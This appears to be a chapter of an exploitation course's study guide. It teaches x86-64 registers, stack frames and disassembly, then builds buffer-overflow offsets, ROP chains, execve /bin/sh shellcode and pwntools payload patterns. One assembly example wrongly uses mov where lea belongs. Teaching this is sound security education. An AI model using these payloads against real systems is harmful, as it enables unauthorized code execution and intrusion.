# 10. x86-64 Assembly for Exploitation - Complete Guide

## Overview
Understanding assembly is **CRITICAL** for buffer overflow, ROP chains, and binary exploitation. This guide focuses on what you need for exploitation.

---

## 10.1 CPU Registers (x86-64)

### General Purpose Registers

**64-bit registers and their subdivisions:**
```
RAX (64-bit) - Accumulator, return values
├─ EAX (32-bit lower half)
│  ├─ AX (16-bit lower half)
│  │  ├─ AH (8-bit upper)
│  │  └─ AL (8-bit lower)

RBX (64-bit) - Base
├─ EBX (32-bit)
│  ├─ BX (16-bit)
│  │  ├─ BH, BL (8-bit)

RCX (64-bit) - Counter
├─ ECX → CX → CH, CL

RDX (64-bit) - Data
├─ EDX → DX → DH, DL

RSI (64-bit) - Source Index
├─ ESI → SI → SIL

RDI (64-bit) - Destination Index
├─ EDI → DI → DIL

RBP (64-bit) - Base Pointer (stack frame)
RSP (64-bit) - Stack Pointer (top of stack)

R8-R15 (64-bit) - Extra registers
├─ R8D-R15D (32-bit)
├─ R8W-R15W (16-bit)
└─ R8B-R15B (8-bit)
```

### Special Registers

```
RIP - Instruction Pointer (next instruction to execute)
RFLAGS - Status flags
  ├─ ZF: Zero Flag (result was zero)
  ├─ CF: Carry Flag (unsigned overflow)
  ├─ SF: Sign Flag (result negative)
  ├─ OF: Overflow Flag (signed overflow)
```

### Example 1: Register Usage in Function Calls

**x86-64 Linux Calling Convention:**
```assembly
; Function arguments (in order):
RDI - 1st argument
RSI - 2nd argument  
RDX - 3rd argument
RCX - 4th argument
R8  - 5th argument
R9  - 6th argument
; More arguments go on stack

; Return value:
RAX - Return value

; Callee-saved (must be preserved):
RBX, RBP, R12-R15

; Caller-saved (can be modified):
RAX, RCX, RDX, RSI, RDI, R8-R11
```

**C code:**
```c
int add(int a, int b, int c) {
    return a + b + c;
}

int main() {
    return add(5, 10, 15);
}
```

**Assembly equivalent:**
```assembly
add:
    ; Arguments: RDI=5, RSI=10, RDX=15
    mov eax, edi        ; EAX = 5
    add eax, esi        ; EAX = 5 + 10 = 15
    add eax, edx        ; EAX = 15 + 15 = 30
    ret                 ; Return 30 in RAX

main:
    mov edi, 5          ; 1st arg
    mov esi, 10         ; 2nd arg
    mov edx, 15         ; 3rd arg
    call add            ; Call function
    ret                 ; Return result in RAX
```

---

## 10.2 Assembly Instructions

### Data Movement

```assembly
; MOV - Copy data
mov rax, 42         ; RAX = 42
mov rax, rbx        ; RAX = RBX
mov rax, [rbx]      ; RAX = memory at address RBX
mov [rax], rbx      ; Memory at RAX = RBX

; LEA - Load Effective Address (calculate address)
lea rax, [rbx + 8]  ; RAX = RBX + 8 (address, not value)
lea rax, [rbx + rcx*4 + 8]  ; Array indexing

; PUSH/POP - Stack operations
push rax            ; RSP -= 8; [RSP] = RAX
pop rax             ; RAX = [RSP]; RSP += 8

; XCHG - Exchange values
xchg rax, rbx       ; Swap RAX and RBX
```

### Arithmetic

```assembly
; ADD/SUB
add rax, 10         ; RAX += 10
sub rax, rbx        ; RAX -= RBX

; INC/DEC - Increment/Decrement
inc rax             ; RAX++
dec rbx             ; RBX--

; MUL/DIV - Unsigned multiply/divide
mul rbx             ; RDX:RAX = RAX * RBX (128-bit result)
div rbx             ; RAX = RDX:RAX / RBX; RDX = remainder

; IMUL/IDIV - Signed versions
imul rax, rbx       ; RAX = RAX * RBX (signed)

; NEG - Negate
neg rax             ; RAX = -RAX
```

### Logical Operations

```assembly
; AND/OR/XOR
and rax, rbx        ; RAX &= RBX
or rax, rbx         ; RAX |= RBX
xor rax, rbx        ; RAX ^= RBX

; XOR trick: Zero register
xor rax, rax        ; RAX = 0 (faster than mov rax, 0)

; NOT - Bitwise NOT
not rax             ; RAX = ~RAX

; Shifts
shl rax, 2          ; RAX <<= 2 (multiply by 4)
shr rax, 1          ; RAX >>= 1 (unsigned divide by 2)
sar rax, 1          ; Arithmetic shift (preserves sign)
```

### Comparison and Jumps

```assembly
; CMP - Compare (subtract but don't store)
cmp rax, rbx        ; Compare RAX and RBX (sets flags)

; TEST - Bitwise AND (sets flags, doesn't store)
test rax, rax       ; Check if RAX is zero

; Conditional jumps (after CMP)
je  label           ; Jump if Equal (ZF=1)
jne label           ; Jump if Not Equal (ZF=0)
jg  label           ; Jump if Greater (signed)
jl  label           ; Jump if Less (signed)
ja  label           ; Jump if Above (unsigned)
jb  label           ; Jump if Below (unsigned)

; Unconditional jump
jmp label           ; Always jump

; Example:
cmp rax, 10
jg greater          ; If RAX > 10
mov rbx, 0          ; RAX <= 10
jmp done
greater:
    mov rbx, 1      ; RAX > 10
done:
```

### Function Calls

```assembly
; CALL - Call function
call function       ; Push RIP; Jump to function

; RET - Return from function
ret                 ; Pop RIP (return address)

; Function prologue (setup stack frame)
push rbp            ; Save old base pointer
mov rbp, rsp        ; Set new base pointer
sub rsp, 32         ; Allocate 32 bytes for locals

; Function epilogue (cleanup)
mov rsp, rbp        ; Restore stack pointer
pop rbp             ; Restore base pointer
ret                 ; Return
```

---

## 10.3 Stack Operations

### Stack Frame Layout

```
High addresses
│
├─── Arguments (if > 6)
├─── Return address    ← CALL pushes this
├─── Saved RBP         ← push rbp
├─── Local variables   ← sub rsp, N
│    [RBP - 8]
│    [RBP - 16]
│    [RBP - 24]
└─── RSP points here
Low addresses

Stack grows DOWN (toward lower addresses)
```

### Example 2: Stack Frame Analysis

**C code:**
```c
int vulnerable(char *input) {
    char buffer[64];
    int x = 10;
    strcpy(buffer, input);
    return x;
}
```

**Assembly:**
```assembly
vulnerable:
    ; Prologue
    push rbp                ; Save old RBP
    mov rbp, rsp            ; RBP = current stack top
    sub rsp, 80             ; Allocate 80 bytes
                            ; 64 for buffer + 4 for x + padding
    
    ; Initialize x = 10
    mov DWORD PTR [rbp-68], 10  ; x at RBP-68
    
    ; strcpy(buffer, input)
    mov rax, [rbp-64]       ; buffer at RBP-64
    mov rsi, rdi            ; input (1st arg) in RDI
    mov rdi, rax            ; buffer address
    call strcpy             ; Vulnerable call!
    
    ; return x
    mov eax, [rbp-68]       ; Return x
    
    ; Epilogue
    leave                   ; mov rsp, rbp; pop rbp
    ret
```

**Memory layout:**
```
[RBP + 8]     : Return address  ← OVERFLOW TARGET
[RBP]         : Saved RBP
[RBP - 8]     : buffer[56-63]
[RBP - 16]    : buffer[48-55]
[RBP - 24]    : buffer[40-47]
[RBP - 32]    : buffer[32-39]
[RBP - 40]    : buffer[24-31]
[RBP - 48]    : buffer[16-23]
[RBP - 56]    : buffer[8-15]
[RBP - 64]    : buffer[0-7]     ← strcpy destination
[RBP - 68]    : x = 10
[RBP - 80]    : padding
```

**Overflow distance:**
```
Buffer start: RBP - 64
Return address: RBP + 8
Distance: 72 bytes

Payload: [64 bytes buffer] + [8 bytes saved RBP] + [target address]
```

---

## 10.4 Reading Disassembly

### Example 3: GDB Disassembly

**View function:**
```bash
$ gdb ./binary
(gdb) disassemble main
```

**Output:**
```assembly
Dump of assembler code for function main:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     sub    rsp,0x10
   0x000000000040115e <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401161 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401165 <+15>:    cmp    DWORD PTR [rbp-0x4],0x2
   0x0000000000401169 <+19>:    je     0x401180 <main+42>
   0x000000000040116b <+21>:    lea    rdi,[rip+0xe92]
   0x0000000000401172 <+28>:    call   0x401030 <puts@plt>
   0x0000000000401177 <+33>:    mov    eax,0x1
   0x000000000040117c <+38>:    jmp    0x4011a0 <main+74>
```

**Understanding the output:**
```
0x0000000000401156        Address of instruction
<+0>                      Offset from function start
push rbp                  Instruction
```

### Example 4: Analyzing Vulnerable Function

**Find buffer overflow:**
```assembly
vulnerable:
   0x401180:  push   rbp
   0x401181:  mov    rbp,rsp
   0x401184:  sub    rsp,0x50          ; 80 bytes allocated
   0x401188:  mov    QWORD PTR [rbp-0x48],rdi  ; Save input
   0x40118c:  lea    rax,[rbp-0x40]    ; buffer at RBP-64
   0x401190:  mov    rsi,QWORD PTR [rbp-0x48]  ; input
   0x401194:  mov    rdi,rax           ; buffer
   0x401197:  call   0x401030 <strcpy@plt>  ; VULNERABLE!
   0x40119c:  nop
   0x40119d:  leave
   0x40119e:  ret
```

**Key observations:**
```
1. Stack allocation: 0x50 = 80 bytes
2. Buffer at RBP-0x40 (RBP-64)
3. strcpy has no bounds check
4. Return address at RBP+8
5. Offset to return: 64 + 8 = 72 bytes
```

---

## 10.5 ROP Gadgets

### What are Gadgets?

**Definition:** Small instruction sequences ending in `ret`

**Example gadgets:**
```assembly
; Gadget 1: pop rdi; ret
0x401234:  pop rdi
0x401235:  ret

; Gadget 2: pop rsi; pop r15; ret
0x401250:  pop rsi
0x401251:  pop r15
0x401252:  ret

; Gadget 3: mov rax, rdi; ret
0x401260:  mov rax, rdi
0x401262:  ret

; Gadget 4: syscall; ret
0x401270:  syscall
0x401271:  ret
```

### Finding Gadgets

```bash
# Using ROPgadget
$ ROPgadget --binary ./binary | grep "pop rdi"
0x0000000000401234 : pop rdi ; ret

# Using ropper
$ ropper --file ./binary --search "pop rdi"
[INFO] File: ./binary
0x0000000000401234: pop rdi; ret;
```

### Example 5: Building ROP Chain

**Goal:** Call `system("/bin/sh")`

**Requirements:**
```
1. RDI = address of "/bin/sh"
2. Call system()
```

**Available gadgets:**
```assembly
pop_rdi = 0x401234   ; pop rdi; ret
bin_sh  = 0x402000   ; "/bin/sh" string
system  = 0x401050   ; system@plt
```

**ROP chain:**
```python
from pwn import *

payload = b'A' * 72         # Fill to return address
payload += p64(pop_rdi)     # Gadget 1
payload += p64(bin_sh)      # Argument for RDI
payload += p64(system)      # Call system("/bin/sh")
```

**Stack execution:**
```
1. Return to pop_rdi (0x401234)
   - Executes: pop rdi; ret
   - RDI = 0x402000 ("/bin/sh")
   - ret pops next address

2. Return to system (0x401050)
   - RDI already contains "/bin/sh"
   - Calls system("/bin/sh")
   - Shell spawned!
```

---

## 10.6 Shellcode Basics

### x86-64 Linux Syscalls

**Syscall convention:**
```assembly
RAX = syscall number
RDI = 1st argument
RSI = 2nd argument
RDX = 3rd argument
R10 = 4th argument
R8  = 5th argument
R9  = 6th argument

syscall instruction invokes kernel
```

**Common syscalls:**
```
execve: RAX=59, RDI=filename, RSI=argv, RDX=envp
read:   RAX=0,  RDI=fd, RSI=buffer, RDX=count
write:  RAX=1,  RDI=fd, RSI=buffer, RDX=count
exit:   RAX=60, RDI=status
```

### Example 6: Execve Shellcode

**Goal:** Execute `/bin/sh`

**Assembly:**
```assembly
section .text
global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    
    xor rax, rax        ; RAX = 0
    push rax            ; Null terminator
    
    ; Push "/bin/sh" onto stack (reversed)
    mov rbx, 0x68732f6e69622f  ; "hs/nib/"
    push rbx
    mov rdi, rsp        ; RDI = pointer to "/bin/sh"
    
    push rax            ; NULL
    mov rsi, rsp        ; RSI = argv = [NULL]
    
    xor rdx, rdx        ; RDX = envp = NULL
    
    mov al, 59          ; RAX = 59 (execve)
    syscall             ; Invoke kernel
```

**Machine code (shellcode):**
```python
shellcode = (
    b"\x48\x31\xc0"              # xor rax, rax
    b"\x50"                      # push rax
    b"\x48\xbb\x2f\x62\x69\x6e"  # mov rbx, "/bin"
    b"\x2f\x73\x68\x00"          # "/sh\x00"
    b"\x53"                      # push rbx
    b"\x48\x89\xe7"              # mov rdi, rsp
    b"\x50"                      # push rax
    b"\x48\x89\xe6"              # mov rsi, rsp
    b"\x48\x31\xd2"              # xor rdx, rdx
    b"\xb0\x3b"                  # mov al, 59
    b"\x0f\x05"                  # syscall
)
```

---

## 10.7 Common Exploitation Patterns

### Pattern 1: Return to Function

```assembly
; Goal: Call win() function at 0x401196

payload = b'A' * 72
payload += p64(0x401196)
```

### Pattern 2: Return to Libc

```python
# Call system("/bin/sh") from libc

payload = b'A' * offset
payload += p64(pop_rdi_ret)    # Set RDI
payload += p64(bin_sh_addr)    # "/bin/sh"
payload += p64(system_addr)    # system()
```

### Pattern 3: ROP to Syscall

```python
# execve("/bin/sh", NULL, NULL)

payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(59)             # execve syscall number
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(pop_rsi_ret)
payload += p64(0)              # NULL
payload += p64(pop_rdx_ret)
payload += p64(0)              # NULL
payload += p64(syscall_ret)
```

### Pattern 4: Stack Pivot

```assembly
; Change RSP to controlled memory

payload = b'A' * offset
payload += p64(pop_rsp_ret)    # Change stack pointer
payload += p64(fake_stack)     # Address of controlled memory
# Rest of ROP chain at fake_stack
```

---

## 🎯 Exam Tips for Assembly

### Key Concepts (Memorize)

```
REGISTERS:
RAX - Return value, syscall number
RDI, RSI, RDX, RCX, R8, R9 - Function arguments (in order)
RBP - Base pointer (stack frame)
RSP - Stack pointer (top of stack)
RIP - Instruction pointer

CALLING CONVENTION:
1st arg: RDI
2nd arg: RSI
3rd arg: RDX
Return: RAX

STACK:
- Grows DOWN (toward lower addresses)
- push: RSP -= 8, store value
- pop: load value, RSP += 8
- call: push RIP, jump
- ret: pop RIP

GADGETS:
- Small instruction sequences ending in ret
- Used for ROP chains
- Find with ROPgadget or ropper
```

### Reading Assembly Questions

**"What does this code do?"**
```assembly
xor rax, rax
push rax
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
```

**Answer approach:**
1. Track register values
2. Identify string on stack (reversed hex)
3. Recognize syscall setup
4. Answer: "Pushes '/bin/sh' onto stack and sets RDI to point to it"

---

## 📝 Quick Reference

```
INSTRUCTION CHEAT SHEET:
mov dst, src     : dst = src
lea dst, [addr]  : dst = addr (not value at addr)
push src         : RSP -= 8; [RSP] = src
pop dst          : dst = [RSP]; RSP += 8
call addr        : push RIP; RIP = addr
ret              : RIP = [RSP]; RSP += 8

add dst, src     : dst += src
sub dst, src     : dst -= src
xor dst, src     : dst ^= src
cmp a, b         : Compare (a - b, set flags)
jmp addr         : Unconditional jump
je addr          : Jump if equal (ZF=1)
jne addr         : Jump if not equal (ZF=0)

STACK LAYOUT:
[RBP + 8]   : Return address
[RBP]       : Saved RBP
[RBP - N]   : Local variables

OVERFLOW CALCULATION:
Buffer at RBP - X
Return at RBP + 8
Offset = X + 8 bytes
```

---

[← Previous: Security Best Practices](./09-security-practices.md) | [Next: Practical Exploitation →](./11-exploitation-practice.md)
